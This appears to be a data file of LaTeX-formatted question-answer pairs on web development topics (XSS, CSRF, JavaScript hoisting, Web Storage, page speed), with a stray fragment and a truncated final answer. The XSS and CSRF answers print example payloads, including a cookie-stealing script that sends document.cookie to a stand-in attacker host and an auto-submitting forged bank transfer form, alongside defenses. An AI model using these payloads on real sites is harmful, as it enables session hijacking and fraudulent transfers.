    "question": "What is an \\texttt{XSS} attack? Make an example.",
    "answer": "Cross-Site Scripting (\\textbf{XSS}) is a type of web security vulnerability that enables attackers to inject client-side scripts (typically JavaScript) into web pages viewed by other users. The core mechanism involves tricking a legitimate web application into sending malicious code to an unsuspecting user's browser. When the user's browser executes this script, it operates within the context of the vulnerable website, effectively bypassing the \\textbf{Same-Origin Policy} and allowing the attacker to perform actions on behalf of the user or steal sensitive information.\n\nThe impact of a successful XSS attack can be severe and includes:\n\\begin{itemize}\n    \\item Stealing \\textbf{session cookies} and session tokens, allowing the attacker to impersonate the user.\n    \\item \\textbf{Defacing} websites or altering content.\n    \\item Redirecting users to malicious sites (\\textbf{phishing}).\n    \\item Executing arbitrary actions on behalf of the user (e.g., changing passwords, making purchases, transferring funds).\n    \\item Installing \\textbf{keyloggers} or other malware by loading external scripts.\n    \\item Performing port scanning or other reconnaissance on the user's internal network.\n\\end{itemize}\n\nXSS attacks are generally categorized into three main types:\n\n\\begin{enumerate}\n    \\item \\textbf{Stored (Persistent) XSS}: This is the most damaging type. The malicious script is permanently stored on the target server (e.g., in a database, forum post, comment section, user profile). When a victim retrieves the affected page, the malicious script is delivered from the server and executed by their browser.\n    \\item \\textbf{Reflected (Non-Persistent) XSS}: The malicious script is \"reflected\" off the web server onto the user's browser, typically via a URL parameter or form submission. The attacker crafts a malicious URL containing the payload and tricks a user into clicking it. The script is not stored on the server but is immediately returned in the server's response.\n    \\item \\textbf{DOM-based XSS}: This vulnerability arises from client-side code that directly manipulates the Document Object Model (\\texttt{DOM}) without proper sanitization. The malicious script is executed as a result of client-side processing of user input or data, rather than being injected by the server. The server's response might not contain the malicious script, but the client-side JavaScript processes it in an unsafe manner.\n\\end{enumerate}\n\n\\subsubsection*{Example: Reflected XSS}\nConsider a simple search page that takes a query from the user and directly echoes it back without proper encoding.\n\n\\texttt{Vulnerable PHP Server-Side Code (\\texttt{search.php}):}\n\\begin{lstlisting}[language=php, basicstyle=\\small\\ttfamily]\n<?php\n    $search_query = $_GET['q']; // Unsanitized input\n    echo \"<h1>Search Results for: \" . $search_query . \"</h1>\";\n    // ... rest of the page displaying search results ...\n?>\n\\end{lstlisting}\n\n\\texttt{Attacker's Actions:}\nAn attacker crafts a malicious URL containing a JavaScript payload and sends it to a victim.\n\\begin{lstlisting}[language=plaintext, basicstyle=\\small\\ttfamily]\nhttp://example.com/search.php?q=<script>alert('XSS Attack! Cookie: ' + document.cookie);</script>\n\\end{lstlisting}\n(A more sophisticated attacker would use a script to send the cookie to their own server, e.g., \\texttt{<script>new Image().src='http://attacker.com/steal?c='+document.cookie;</script>})\n\n\\texttt{Victim's Browser Response (Simplified HTML):}\nWhen the victim clicks the link, the server receives the request, takes the \\texttt{q} parameter, and embeds it directly into the HTML response. The browser then renders this page:\n\\begin{lstlisting}[language=html, basicstyle=\\small\\ttfamily]\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Search Results</title>\n</head>\n<body>\n    <h1>Search Results for: <script>alert('XSS Attack! Cookie: ' + document.cookie);</script></h1>\n    <!-- ... rest of the page ... -->\n</body>\n</html>\n\\end{lstlisting}\n\n\\texttt{Explanation:}\nThe victim's browser receives the HTML. Instead of treating `<script>alert('XSS Attack! Cookie: ' + document.cookie);</script>` as plain text within the \\texttt{<h1>} tag, it parses it as an active HTML \\texttt{<script>} element. The JavaScript code inside the script tags is then executed by the browser within the context of \\texttt{example.com}. In this example, an alert box would pop up displaying the user's session cookie. If the attacker used a script to send the cookie to their server, the cookie would be silently transmitted without the user's knowledge, allowing the attacker to hijack the user's session.\n\n\\subsubsection*{Mitigation Strategies:}\nTo prevent XSS attacks, applications must rigorously validate and sanitize all user input and, crucially, \\textbf{output encode} all user-supplied data before rendering it in HTML, JavaScript, or URL contexts. Key defenses include:\n\\begin{itemize}\n    \\item \\textbf{Output Encoding/Escaping}: This is the most critical defense. Convert potentially malicious characters (like \\texttt{<}, \\texttt{>}, \\texttt{\"}, \\texttt{' }, \\texttt{&}) into their HTML entities (e.g., \\texttt{\\&lt;}, \\texttt{\\&gt;}) before displaying user-supplied data. Functions like \\texttt{htmlspecialchars()} in PHP or templating engine auto-escaping features are essential.\n    \\item \\textbf{Input Validation}: While not a primary XSS defense, validating input for expected data types, length, and format can help reduce the attack surface.\n    \\item \\textbf{Content Security Policy (CSP)}: A security mechanism that helps mitigate XSS attacks by allowing web administrators to specify valid sources for content (scripts, stylesheets, images, etc.) that the browser should load. This can restrict or block the execution of injected scripts.\n    \\item \\textbf{HTTP-Only Cookies}: Setting the \\texttt{HttpOnly} flag on cookies prevents client-side scripts from accessing them, mitigating the impact of XSS attacks aimed at stealing session cookies.\n\\end{itemize}",

    "question": "What is a \\texttt{CSRF} attack?",
    "answer": "\\textbf{Cross-Site Request Forgery (CSRF)}, often pronounced \\textbf{Sea-Surf} or also known as \\textbf{XSRF}, is a type of malicious exploit where an attacker tricks a web browser into executing an unwanted action on a trusted site for which the user is currently authenticated. The attack leverages the fact that web browsers automatically send authentication credentials, such as session cookies, with requests made to a domain, regardless of the request's origin.\n\n\\subsection*{How a CSRF Attack Works}\nA CSRF attack typically unfolds in the following steps:\n\\begin{enumerate}\n    \\item \\textbf{Victim Authenticates:} The victim logs into a legitimate web application (e.g., \\texttt{bank.com}), establishing an authenticated session. The application stores authentication information, often in a session cookie.\n    \\item \\textbf{Attacker Crafts Malicious Request:} The attacker anticipates a state-changing action that the legitimate application allows (e.g., transferring money, changing a password, deleting an account). They then craft a request (often an HTTP \\texttt{GET} or \\texttt{POST} request) that, if executed by the victim's browser, would perform this unwanted action.\n    \\item \\textbf{Attacker Lures Victim:} The attacker embeds this malicious request into a deceptive website (e.g., \\texttt{attacker.com}). This could be a hidden \\texttt{<img>} tag, a hidden \\texttt{<form>} that automatically submits via JavaScript, or an \\texttt{<iframe>} that points to the legitimate site's action URL. The attacker then tricks the victim into visiting \\texttt{attacker.com} (e.g., via a phishing email, a malicious advertisement).\n    \\item \\textbf{Browser Sends Forged Request:} When the victim's browser loads \\texttt{attacker.com}, it automatically attempts to execute the embedded malicious request targeting \\texttt{bank.com}. Crucially, because the victim is still logged into \\texttt{bank.com}, their browser automatically includes the valid session cookies for \\texttt{bank.com} with this forged request.\n    \\item \\textbf{Legitimate Site Processes Request:} The legitimate \\texttt{bank.com} server receives the request. Because it contains valid session cookies, the server perceives it as a legitimate request from the authenticated user and processes the unwanted action.\n\\end{enumerate}\n\n\\subsection*{Impact}\nThe impact of a successful CSRF attack can range from minor inconvenience to severe financial loss or data compromise:\n\\begin{itemize}\n    \\item Unauthorized fund transfers or purchases.\n    \\item Password changes, leading to account takeover.\n    \\item Email address changes, redirecting sensitive communications.\n    \\item Data deletion or modification.\n    \\item Session termination (logout).\n    \\item Administrator account compromise, potentially leading to full system control.\n\\end{itemize}\n\n\\subsection*{Example}\nConsider a bank website \\texttt{bank.com} where a user can transfer money using a \\texttt{POST} request to \\texttt{https://bank.com/transfer} with parameters like \\texttt{toAccount} and \\texttt{amount}.\n\n\\begin{lstlisting}[language=html, caption={Example of a CSRF attack payload on \\texttt{attacker.com}}]\n<!-- Malicious website (attacker.com) -->\n<html>\n<body>\n    <h1>Congratulations, you've won a new car!</h1>\n    <p>Click anywhere on this page to claim your prize.</p>\n\n    <!-- This form is hidden and automatically submits -->\n    <form action=\"https://bank.com/transfer\" method=\"POST\" id=\"csrfForm\" style=\"display:none;\">\n        <input type=\"hidden\" name=\"toAccount\" value=\"attackerAccount\" />\n        <input type=\"hidden\" name=\"amount\" value=\"1000\" />\n    </form>\n\n    <script>\n        // Automatically submit the form when the page loads\n        document.getElementById('csrfForm').submit();\n    </script>\n</body>\n</html>\n\\end{lstlisting}\nIf a victim, while logged into \\texttt{bank.com}, visits this malicious page, their browser will silently submit the form to \\texttt{bank.com/transfer}. The bank's server, receiving the valid session cookie, will process the transfer of \\$1000 to \\texttt{attackerAccount} as if the legitimate user initiated it.\n\n\\subsection*{Defenses Against CSRF Attacks}\nSeveral robust defenses exist to prevent CSRF attacks:\n\n\\subsubsection*{\\textbf{1. CSRF Tokens (Synchronizer Token Pattern)}}\nThis is the most common and effective defense.\n\\begin{itemize}\n    \\item \\textbf{Mechanism:} The server generates a unique, secret, and unpredictable token for each user session. This token is embedded in a hidden field within every HTML form or included in custom headers for AJAX requests.\n    \\item \\textbf{Verification:} When a request is submitted, the server verifies that the token included in the request matches the token associated with the user's session. If the tokens do not match or if a token is missing, the request is rejected.\n    \\item \\textbf{Why it works:} An attacker cannot predict or steal the valid CSRF token because of the \\textbf{Same-Origin Policy}. They cannot read the legitimate site's HTML content (which contains the token) from their malicious domain, nor can they directly read cookies set with \\texttt{HttpOnly}.\n\\end{itemize}\n\n\\subsubsection*{\\textbf{2. SameSite Cookies}}\nThis browser-level defense adds an attribute to cookies to control when they are sent with cross-site requests.\n\\begin{itemize}\n    \\item \\textbf{\\texttt{Lax}} (default for most modern browsers): Cookies are sent with top-level navigations via \\texttt{GET} requests (e.g., clicking a link), but not with other cross-site requests like \\texttt{POST} forms or AJAX. This provides good protection against many CSRF vectors.\n    \\item \\textbf{\\texttt{Strict}}: Cookies are never sent with any cross-site request, regardless of HTTP method or navigation type. This offers the strongest protection but can impact legitimate cross-site functionality (e.g., links from other sites).\n    \\item \\textbf{\\texttt{None}}: Allows cookies to be sent with all cross-site requests, but requires the \\texttt{Secure} attribute (cookie must be sent over HTTPS). This option explicitly opts out of CSRF protection from \\texttt{SameSite} cookies.\n\\end{itemize}\nWhile highly effective, \\texttt{SameSite} cookies might not be a complete defense, especially for older browsers or specific edge cases. They should be used in conjunction with CSRF tokens.\n\n\\subsubsection*{\\textbf{3. Referer Header Check}}\nThe server checks the \\texttt{Referer} (or \\texttt{Referrer}) HTTP header to ensure that the request originated from the legitimate domain.\n\\begin{itemize}\n    \\item \\textbf{Mechanism:} The server inspects the \\texttt{Referer} header to see if the previous page (the origin of the request) matches its own domain.\n    \\item \\textbf{Limitations:} This defense is not foolproof. Users or network devices can disable or strip the \\texttt{Referer} header, some browser extensions might modify it, and it can sometimes be spoofed.\n\\end{itemize}\n\n\\subsubsection*{\\textbf{4. Double Submit Cookie}}\nThis method is an alternative to CSRF tokens, particularly useful for stateless APIs where storing server-side tokens is challenging.\n\\begin{itemize}\n    \\item \\textbf{Mechanism:} The server sends a cryptographically strong pseudo-random value in a cookie to the client. The client-side JavaScript then reads this cookie value and includes it as a custom HTTP header or a form field in every subsequent request.\n    \\item \\textbf{Verification:} The server verifies that the value in the custom header/form field matches the value in the cookie.\n    \\item \\textbf{Why it works:} An attacker cannot read cross-site cookies due to the Same-Origin Policy, so they cannot include the correct token in their forged request.\n\\end{itemize}\n\n\\subsubsection*{\\textbf{5. User Re-authentication or CAPTCHA}}\nFor highly sensitive actions, requiring the user to re-enter their password or complete a CAPTCHA can provide an additional layer of security. This directly involves user interaction, which an attacker cannot forge.",

    "question": "How is a \\texttt{CSRF} attack different from an \\texttt{XSS} attack? Make an example.",
    "answer": "\\noindent \\textbf{Cross-Site Request Forgery (CSRF)} and \\textbf{Cross-Site Scripting (XSS)} are distinct web security vulnerabilities, though both involve a trusted website and an unsuspecting user. Understanding their differences is crucial for effective web application security.\n\n\\textbf{Cross-Site Request Forgery (CSRF)}\nA \\textbf{CSRF} attack (sometimes pronounced \"sea-surf\") tricks an authenticated user's browser into sending an unintentional, malicious request to a web application where they are currently logged in. The core idea is that the attacker exploits the trust a web application has in the user's browser to perform state-changing actions.\n\n\\begin{itemize}\n    \\item \\textbf{Mechanism:} The attacker crafts a malicious web page, email, or script that includes a request to a legitimate web application. This request is designed to perform an action on behalf of the victim (e.g., change password, transfer funds, make a purchase). When the victim, who is already authenticated to the target web application, visits the attacker's page, their browser automatically sends the request along with their session cookies. The legitimate web application, seeing valid session cookies, processes the request as if the victim willingly initiated it.\n    \\item \\textbf{Target:} The \\textit{victim's browser} to force it to send a request to a \\textit{trusted, authenticated website}.\n    \\item \\textbf{Impact:} Unauthorized actions are performed on the target website from the perspective of the legitimate user. The attacker does not typically see the response to the forged request.\n    \\item \\textbf{Key Insight:} CSRF exploits the browser's behavior of automatically attaching cookies (including session identifiers) to requests made to a domain, regardless of the origin of the page that initiated the request.\n    \\item \\textbf{Example:}\n    An attacker sends an email with a link or embeds a hidden \\texttt{<img>} tag on a malicious website. If the victim is logged into their bank account and visits the attacker's site, their browser might unknowingly send a request like this:\n\\begin{lstlisting}[language=HTML,basicstyle=\\ttfamily\\small,breaklines=true]\n<img src=\"https://bank.example.com/transfer?account=ATTACKER_ACCOUNT&amount=1000\" style=\"display:none;\" />\n\\end{lstlisting}\n    This request, if successfully executed by the victim's browser, could transfer \\$1000 to the attacker's account. The attacker relies on the victim being logged into \\texttt{bank.example.com} at the time of visiting the malicious page.\n\\end{itemize}\n\n\\textbf{Cross-Site Scripting (XSS)}\nA \\textbf{XSS} attack involves an attacker injecting malicious client-side scripts (typically \\texttt{JavaScript}) into a legitimate web page viewed by other users. The goal is to make the victim's browser execute the attacker's code within the security context of the vulnerable website.\n\n\\begin{itemize}\n    \\item \\textbf{Mechanism:} XSS occurs when a web application takes untrusted user input and embeds it directly into its output \\texttt{HTML} without proper validation or sanitization. When another user views the compromised page, their browser executes the injected script as if it were part of the legitimate website's code.\n    \\item \\textbf{Target:} The \\textit{victim's browser} to execute arbitrary malicious code within the context of the \\textit{trusted website}.\n    \\item \\textbf{Impact:} Session hijacking (stealing session cookies), defacement of the website, redirection to malicious sites, keylogging, performing arbitrary actions on behalf of the user, or even fully controlling their browser session. The attacker can interact with the legitimate website's \\texttt{DOM} and access sensitive data accessible to the user.\n    \\item \\textbf{Key Insight:} XSS exploits the trust a user has in a website. When the user visits a seemingly legitimate site, their browser executes any script present, including the attacker's injected script, with the same privileges as the site's own scripts.\n    \\item \\textbf{Example:}\n    Consider a vulnerable forum where user comments are displayed without proper escaping. An attacker posts a comment like:\n\\begin{lstlisting}[language=HTML,basicstyle=\\ttfamily\\small,breaklines=true]\n<script>alert('You have been XSSed! Your cookie is: ' + document.cookie);</script>\n\\end{lstlisting}\n    When another user views this comment, their browser executes the \\texttt{JavaScript}. This simple example just shows an alert, but the script could instead send the user's session cookie to an attacker's server, enabling session hijacking.\n\\end{itemize}\n\n\\textbf{Key Differences Summarized}\nThe fundamental distinctions between CSRF and XSS attacks are as follows:\n\n\\begin{itemize}\n    \\item \\textbf{Nature of Attack:}\n    \\begin{itemize}\n        \\item \\textbf{CSRF:} Forces the victim's browser to \\textit{send an unintended request} to a trusted site. The attack relies on the browser automatically attaching cookies to the request.\n        \\item \\textbf{XSS:} Forces the victim's browser to \\textit{execute malicious code} within the context of a trusted site. The attack exploits a vulnerability in the site's handling of user input.\n    \\end{itemize}\n    \\item \\textbf{Trust Exploited:}\n    \\begin{itemize}\n        \\item \\textbf{CSRF:} Exploits the trust a \\textit{web application} has in a \\textit{user's browser} (that requests coming from it are legitimate).\n        \\item \\textbf{XSS:} Exploits the trust a \\textit{user} has in a \\textit{website} (that content displayed is safe and legitimate).\n    \\end{itemize}\n    \\item \\textbf{Impact:}\n    \\begin{itemize}\n        \\item \\textbf{CSRF:} Primarily causes \\textit{unauthorized actions} (state changes) on the target server. The attacker typically doesn't see the response.\n        \\item \\textbf{XSS:} Allows \\textit{arbitrary code execution} in the victim's browser, leading to data theft (e.g., cookies, local storage), website defacement, or full control over the user's session. The attacker can often read and modify content on the page.\n    \\end{itemize}\n    \\item \\textbf{Attack Vector:}\n    \\begin{itemize}\n        \\item \\textbf{CSRF:} Often originates from an \\textit{external, malicious site} that sends a request to the vulnerable site.\n        \\item \\textbf{XSS:} Involves injecting code \\textit{into the vulnerable site itself}, which is then executed when other users visit that site.\n    \\end{itemize}\n    \\item \\textbf{Same-Origin Policy (SOP):}\n    \\begin{itemize}\n        \\item \\textbf{CSRF:} \\textit{Bypasses} the \\texttt{SOP} by leveraging requests (like image loads or form submissions) that browsers are permitted to make cross-origin, carrying the victim's cookies.\n        \\item \\textbf{XSS:} \\textit{Executes within} the \\texttt{SOP} boundary of the trusted site, gaining access to resources and data that would normally be restricted from other origins.\n    \\end{itemize}\n    \\item \\textbf{Prerequisite for attack:}\n    \\begin{itemize}\n        \\item \\textbf{CSRF:} Requires the victim to be \\textit{authenticated} to the target site at the time of the attack.\n        \\item \\textbf{XSS:} Requires the vulnerable site to reflect or store \\textit{unsanitized user input}. If successful, it can often bypass authentication (e.g., by stealing session cookies).\n    \\end{itemize}\n\\end{itemize}",

    "question": "\\texttt{Javascript} variables hoisting meaning.",
    "answer": "Hoisting in \\texttt{Javascript} is a behavior where variable and function declarations are conceptually moved to the top of their containing scope during the compilation phase, before the code is executed. It's important to understand that it's only the \\textbf{declaration} that is hoisted, not the initialization or assignment. This means that you can use variables and functions before they are formally declared in the code, though their behavior will differ based on how they were declared.\n\n\\section*{1. Hoisting with \\texttt{var}}\nWhen variables are declared using \\texttt{var}, their declarations are hoisted to the top of their functional (or global) scope. They are also automatically \\textbf{initialized with a value of \\texttt{undefined}} at the time of hoisting. Any assignment made to the variable remains in its original position.\n\n\\begin{lstlisting}[language=Javascript]\nconsole.log(myVar); // Output: undefined\nvar myVar = 10;\nconsole.log(myVar); // Output: 10\n\n// The Javascript engine effectively reinterprets this as:\n// var myVar; // Declaration is hoisted and initialized to undefined\n// console.log(myVar);\n// myVar = 10; // Assignment remains in place\n// console.log(myVar);\n\\end{lstlisting}\n\n\\section*{2. Hoisting with \\texttt{let} and \\texttt{const} (and Temporal Dead Zone)}\nVariables declared with \\texttt{let} and \\texttt{const} are also hoisted, but they are \\textbf{not initialized}. Instead, they remain in an uninitialized state until the actual declaration statement is encountered in the code. Any attempt to access them before this point will result in a \\texttt{ReferenceError}. This period between the start of the scope and the actual declaration where the variable cannot be accessed is known as the \\textbf{Temporal Dead Zone (TDZ)}. \\texttt{let} and \\texttt{const} declarations are block-scoped.\n\n\\begin{lstlisting}[language=Javascript]\n// console.log(myLet); // ReferenceError: Cannot access 'myLet' before initialization\nlet myLet = 20;\nconsole.log(myLet); // Output: 20\n\n// The Javascript engine effectively reinterprets this as:\n// let myLet; // myLet is hoisted but uninitialized and in TDZ\n// console.log(myLet); // Accessing myLet in TDZ throws ReferenceError\n// myLet = 20; // myLet is initialized and leaves TDZ\n// console.log(myLet);\n\n// The same TDZ behavior applies to const:\n// console.log(myConst); // ReferenceError: Cannot access 'myConst' before initialization\n// const myConst = 30;\n\\end{lstlisting}\n\n\\section*{3. Hoisting Function Declarations vs. Function Expressions}\n\n\\subsection*{3.1. Function Declarations}\nEntire function declarations (the function name and its body) are hoisted to the top of their scope. This means you can call a function declared this way before its actual declaration in the code.\n\n\\begin{lstlisting}[language=Javascript]\nsayHello(); // Output: Hello from function declaration!\n\nfunction sayHello() {\n  console.log(\"Hello from function declaration!\");\n}\n\\end{lstlisting}\n\n\\subsection*{3.2. Function Expressions}\nFunction expressions, where a function is assigned to a variable, behave like regular variable hoisting. If declared with \\texttt{var}, the variable name is hoisted and initialized to \\texttt{undefined}. If declared with \\texttt{let} or \\texttt{const}, it enters the TDZ. The function body itself is not hoisted.\n\n\\begin{lstlisting}[language=Javascript]\n// With var (variable is hoisted, but value is undefined)\nconsole.log(sayHiVar); // Output: undefined\n// sayHiVar(); // TypeError: sayHiVar is not a function (because it's undefined)\nvar sayHiVar = function() {\n  console.log(\"Hi from function expression (var)!\");\n};\nsayHiVar(); // Output: Hi from function expression (var)!\n\n// With let (variable is hoisted, but in TDZ)\n// console.log(sayHiLet); // ReferenceError: Cannot access 'sayHiLet' before initialization\nlet sayHiLet = function() {\n  console.log(\"Hi from function expression (let)!\");\n};\nsayHiLet(); // Output: Hi from function expression (let)!\n\\end{lstlisting}\n\n\\section*{4. Key Takeaways}\n\\begin{itemize}\n    \\item \\textbf{Declarations, not initializations/assignments, are hoisted.}\n    \\item \\texttt{var} variables are hoisted and automatically initialized to \\texttt{undefined}.\n    \\item \\texttt{let} and \\texttt{const} variables are hoisted but not initialized, residing in the \\textbf{Temporal Dead Zone (TDZ)} until their declaration. Accessing them in the TDZ results in a \\texttt{ReferenceError}.\n    \\item \\textbf{Function declarations} are fully hoisted, allowing them to be called before their definition.\n    \\item \\textbf{Function expressions} follow the hoisting rules of their assigned variable type (\\texttt{var}, \\texttt{let}, or \\texttt{const}).\n\\end{itemize}",

Understanding these distinctions is crucial for writing robust and predictable JavaScript code.\n\n\\subsection*{\\texttt{var}}\n\\begin{itemize}\n    \\item \\textbf{Scope}: Variables declared with \\texttt{var} are \\textbf{function-scoped} (or global-scoped if declared outside any function).

    "question": "Difference between \\texttt{localStorage} and \\texttt{sessionStorage}.",
    "answer": "The \\textbf{Web Storage API} provides mechanisms for web applications to store data client-side within the user's browser. This API offers two main objects: \\texttt{localStorage} and \\texttt{sessionStorage}. Both provide a persistent key-value store, but they differ significantly in their scope, persistence, and expiration characteristics.\n\n\\subsection*{1. \\texttt{localStorage}}\n\\texttt{localStorage} allows web applications to store data persistently within the user's browser, with no explicit expiration time.\n\n\\begin{itemize}\n    \\item \\textbf{Persistence}: Data stored in \\texttt{localStorage} remains available even after the browser window is closed, the browser is quit, or the computer is restarted. It persists indefinitely until explicitly cleared by the web application, the user through browser settings, or specific browser actions.\n    \\item \\textbf{Scope}: Data is specific to the \\textbf{origin} (i.e., scheme, hostname, and port). This means data stored by \\texttt{https://example.com:8080} is isolated from \\texttt{http://example.com} or \\texttt{anotherexample.com}. Crucially, it's shared across \\textit{all tabs and windows} from the same origin.\n    \\item \\textbf{Capacity}: Typically provides a larger storage capacity compared to cookies, ranging from 5MB to 10MB per origin, depending on the browser.\n    \\item \\textbf{Accessibility}: Accessible via the \\texttt{window.localStorage} object from JavaScript.\n\\end{itemize}\n\n\\subsection*{2. \\texttt{sessionStorage}}\n\\texttt{sessionStorage} stores data only for the duration of a single browser session.\n\n\\begin{itemize}\n    \\item \\textbf{Persistence}: Data stored in \\texttt{sessionStorage} is cleared when the browser tab or window in which it was created is closed. It is not preserved across browser restarts. If a user closes a tab and then reopens the same URL in a new tab, the \\texttt{sessionStorage} for the new tab will be empty, as it represents a new session.\n    \\item \\textbf{Scope}: Data is also specific to the \\textbf{origin}, but unlike \\texttt{localStorage}, it is unique to each \\textit{individual tab or window}. If you open two tabs to the same website (\\texttt{https://example.com}), they will have separate \\texttt{sessionStorage} objects. This means data set in one tab's \\texttt{sessionStorage} is not accessible in another tab's \\texttt{sessionStorage}, even if they are for the same origin.\n    \\item \\textbf{Capacity}: Similar to \\texttt{localStorage}, typically 5MB to 10MB per origin, but this capacity is allocated per tab/window.\n    \\item \\textbf{Accessibility}: Accessible via the \\texttt{window.sessionStorage} object from JavaScript.\n\\end{itemize}\n\n\\subsection*{3. Key Differences Summary}\nThe fundamental distinctions between \\texttt{localStorage} and \\texttt{sessionStorage} can be summarized as follows:\n\n\\begin{tabular}{|p{3cm}|p{6cm}|p{6cm}|}\n    \\hline\n    \\textbf{Feature} & \\textbf{\\texttt{localStorage}} & \\textbf{\\texttt{sessionStorage}} \\\\\n    \\hline\n    \\textbf{Persistence} & Permanent; data persists even after the browser is closed. & Session-based; data is cleared when the browser tab/window is closed. \\\\\n    \\hline\n    \\textbf{Scope} & Per origin; shared across all tabs and windows from the same origin. & Per origin and per tab/window; unique for each tab/window. \\\\\n    \\hline\n    \\textbf{Expiration} & No explicit expiration. Data is stored indefinitely. & Expires when the browsing session ends (tab/window is closed). \\\\\n    \\hline\n    \\textbf{Capacity} & Typically 5--10 MB per origin. & Typically 5--10 MB per origin, per tab. \\\\\n    \\hline\n    \\textbf{Use Case} & Long-term user preferences, offline data caching, persistent shopping carts. & Temporary, session-specific data, multi-step form data. \\\\\n    \\hline\n\\end{tabular}\n\\vspace{0.5em} % Add some vertical space\n\n\\subsection*{4. Common API Methods}\nBoth \\texttt{localStorage} and \\texttt{sessionStorage} implement the same API methods, providing a consistent way to interact with the stored data:\n\\begin{itemize}\n    \\item \\texttt{setItem(key, value)}: Adds or updates a key-value pair. Both \\texttt{key} and \\texttt{value} must be strings.\n    \\item \\texttt{getItem(key)}: Retrieves the value associated with the given \\texttt{key}. Returns \\texttt{null} if the key does not exist.\n    \\item \\texttt{removeItem(key)}: Removes the key-value pair associated with the given \\texttt{key}.\n    \\item \\texttt{clear()}: Removes all key-value pairs from storage for that origin/tab.\n    \\item \\texttt{key(index)}: Returns the name of the key at the specified \\texttt{index}.\n    \\item \\texttt{length}: Returns the number of key-value pairs currently stored.\n\\end{itemize}\n\n\\textbf{Important Note}: The Web Storage API only stores strings. If you need to store JavaScript objects or arrays, you must first serialize them to a JSON string using \\texttt{JSON.stringify()} before storing, and parse them back using \\texttt{JSON.parse()} upon retrieval.\n\n\\subsection*{5. Example}\nHere's a JavaScript example demonstrating the usage of both storage types:\n\\begin{lstlisting}[language=JavaScript, caption=localStorage and sessionStorage Example]\n// --- Using localStorage ---\n// Set an item\nlocalStorage.setItem('username', 'Alice');\nlocalStorage.setItem('theme', 'dark');\n\n// Get an item\nlet storedUsername = localStorage.getItem('username'); // 'Alice'\nconsole.log('localStorage username:', storedUsername);\n\n// Store an object (serialized to JSON)\nconst userSettings = {\n    notifications: true,\n    language: 'en'\n};\nlocalStorage.setItem('settings', JSON.stringify(userSettings));\n\n// Retrieve and parse the object\nlet retrievedSettings = JSON.parse(localStorage.getItem('settings'));\nconsole.log('localStorage settings:', retrievedSettings);\n\n// Remove an item\nlocalStorage.removeItem('theme');\n\n// Clear all items (use with caution!)\n// localStorage.clear();\n\n\n// --- Using sessionStorage ---\n// Set an item\nsessionStorage.setItem('session_id', 'xyz123abc');\nsessionStorage.setItem('current_page', '/dashboard');\n\n// Get an item\nlet sessionId = sessionStorage.getItem('session_id'); // 'xyz123abc'\nconsole.log('sessionStorage session ID:', sessionId);\n\n// Store an object (serialized to JSON)\nconst tempState = {\n    filter: 'active',\n    sort: 'date'\n};\nsessionStorage.setItem('tempState', JSON.stringify(tempState));\n\n// Retrieve and parse the object\nlet retrievedTempState = JSON.parse(sessionStorage.getItem('tempState'));\nconsole.log('sessionStorage temporary state:', retrievedTempState);\n\n// Remove an item\nsessionStorage.removeItem('current_page');\n\n// Clear all items for this session/tab\n// sessionStorage.clear();\n\\end{lstlisting}\n\n\\subsection*{6. Security Considerations}\n\\begin{itemize}\n    \\item \\textbf{No encryption}: Data stored in both \\texttt{localStorage} and \\texttt{sessionStorage} is not encrypted by default and is easily accessible via browser developer tools. Therefore, sensitive information (like passwords, credit card numbers, or unprotected authentication tokens) should \\textbf{never} be stored directly in either.\n    \\item \\textbf{XSS Vulnerability}: Both are vulnerable to Cross-Site Scripting (XSS) attacks. If an attacker can inject malicious JavaScript into your page, they can access and manipulate any data stored in \\texttt{localStorage} or \\texttt{sessionStorage}. Server-side HTTP-only cookies are generally preferred for storing sensitive authentication tokens because they are inaccessible to JavaScript.\n    \\item \\textbf{Origin-based Security}: Data is strictly isolated by origin, preventing one website from accessing another's stored data.\n\\end{itemize}",

    "question": "How to reduce loading time of \\texttt{HTTP} page?",
    "answer": "\\textbf{Reducing the loading time of an HTTP page} involves a multi-faceted approach, targeting optimizations across resource delivery, client-side processing, and server-side performance. The primary goal is to minimize the amount of data transferred, the number of requests, and the time the browser spends processing and rendering the page.\n\n\\subsection*{I. Resource Optimization}\nThese strategies focus on reducing the size of the assets transferred over the network.\n\n\\begin{itemize}\n    \\item \\textbf{Minification}: Remove unnecessary characters (whitespace, comments, block delimiters) from HTML, CSS, and JavaScript files without changing their functionality. This significantly reduces file size. Tools like \\texttt{UglifyJS} or \\texttt{terser} for JavaScript and \\texttt{CSSnano} for CSS are commonly used.\n    \\item \\textbf{Compression}: Enable server-side compression algorithms like \\texttt{Gzip} or \\texttt{Brotli} for text-based assets (HTML, CSS, JavaScript, JSON, SVG). The server compresses the files before sending them, and the browser decompresses them, leading to faster transfer times. This is typically configured in the web server (e.g., Apache's \\texttt{mod\\_deflate}, Nginx's \\texttt{ngx\\_http\\_gzip\\_module}).\n    \\item \\textbf{Image Optimization}:\n    \\begin{itemize}\n        \\item \\textbf{Choose Appropriate Formats}: Use modern formats like \\texttt{WebP} for images, which often offer superior compression compared to JPEG or PNG. Use JPEG for photographic content and PNG for graphics with transparency. SVG is ideal for vector graphics.\n        \\item \\textbf{Compress Images}: Use image optimization tools (e.g., \\texttt{ImageOptim}, \\texttt{TinyPNG}, server-side libraries) to reduce file size without significant loss of quality.\n        \\item \\textbf{Responsive Images}: Serve images at the appropriate size for the user's viewport using \\texttt{srcset} and \\texttt{sizes} attributes in the \\texttt{<img>} tag or the \\texttt{<picture>} element. This prevents sending oversized images to smaller screens.\n        \\item \\textbf{Lazy Loading}: Defer the loading of images, videos, and iframes that are not immediately visible in the user's viewport until they are about to scroll into view. This can be achieved with the native \\texttt{loading=\"lazy\"} attribute or JavaScript Intersection Observer API.\n    \\end{itemize}\n    \\item \\textbf{Font Optimization}:\n    \\begin{itemize}\n        \\item \\textbf{Use Modern Formats}: Prefer \\texttt{WOFF2} for web fonts, which offers better compression and performance than \\texttt{WOFF} or \\texttt{TTF}.\n        \\item \\textbf{Font Subsetting}: Include only the characters and weights truly needed (e.g., Latin characters only, specific symbols), reducing font file size.\n        \\item \\textbf{Apply \\texttt{font-display}} property: Use \\texttt{swap} or \\texttt{optional} in your \\texttt{@font-face} CSS rules to control font loading behavior and prevent invisible text during loading (\\textbf{FOIT} - Flash of Invisible Text) or layout shifts.\n    \\end{itemize}\n\\end{itemize}\n\n\\subsection*{II. Request Optimization}\nThese techniques aim to reduce the number of HTTP requests and optimize how they are handled.\n\n\\begin{itemize}\n    \\item \\textbf{Leverage Browser Caching}: Implement strong caching policies using HTTP headers like \\texttt{Cache-Control}, 